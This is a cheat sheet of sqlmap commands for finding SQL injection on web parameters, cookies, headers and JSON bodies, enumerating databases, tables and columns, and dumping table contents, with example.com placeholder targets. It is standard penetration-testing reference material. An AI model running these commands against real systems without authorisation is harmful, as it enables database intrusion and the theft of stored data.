**SQLMap Cheat Sheet**

---

### **Basic Usage**

 Run SQLMap on a URL with a parameter 

```bash
sqlmap -u "http://www.example.com/?id=1"
```

---

### **Using cURL Requests**

 Convert cURL request to SQLMap 

```bash
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0' -H 'Accept: image/webp,*/*' --compressed
```

---

### **GET & POST Requests**

 Test GET parameters 

```bash
sqlmap -u "http://www.example.com/?id=1"
```

 Test POST parameters 

```bash
sqlmap -u "http://www.example.com/" --data "uid=1&name=test"
```

 Test specific parameter 

```bash
sqlmap -u "http://www.example.com/" --data "uid=1*&name=test" -p uid
```

---

### **Using Request Files**

 Run SQLMap on a request file 

```bash
sqlmap -r request.txt
```

---

### **Custom Headers & Cookies**

 Use a custom cookie 

```bash
sqlmap -u "http://www.example.com/" --cookie="PHPSESSID=1234567890abcdef"
```

 Use a custom User-Agent 

```bash
sqlmap -u "http://www.example.com/" -H "User-Agent: CustomAgent/1.0"
```

 Randomize User-Agent 

```bash
sqlmap -u "http://www.example.com/" --random-agent
```

---

### **Advanced Testing**

 Test HTTP headers for SQLi 

```bash
sqlmap -u "http://www.example.com/" --cookie="id=1*"
```

 Specify an HTTP method (e.g., PUT) 

```bash
sqlmap -u "http://www.example.com/" --data="id=1" --method PUT
```

---

### **Testing JSON & XML Requests**

 Test JSON data 

```bash
sqlmap -u "http://www.example.com/" --data '{"id":1}'
```

 Test complex request file (JSON/XML) 

```bash
sqlmap -r request.json
```

---

### **Database Enumeration**

 Get database names 

```bash
sqlmap -u "http://www.example.com/?id=1" --dbs
```

 Get tables from a specific database 

```bash
sqlmap -u "http://www.example.com/?id=1" -D db_name --tables
```

 Get columns from a specific table 

```bash
sqlmap -u "http://www.example.com/?id=1" -D db_name -T table_name --columns
```

 Dump data from a table 

```bash
sqlmap -u "http://www.example.com/?id=1" -D db_name -T table_name --dump
```

---

### **Automated Crawling & Testing**

 Automatically crawl and find SQLi vulnerabilities 

```bash
sqlmap -u "http://www.example.com/" --crawl=3
```
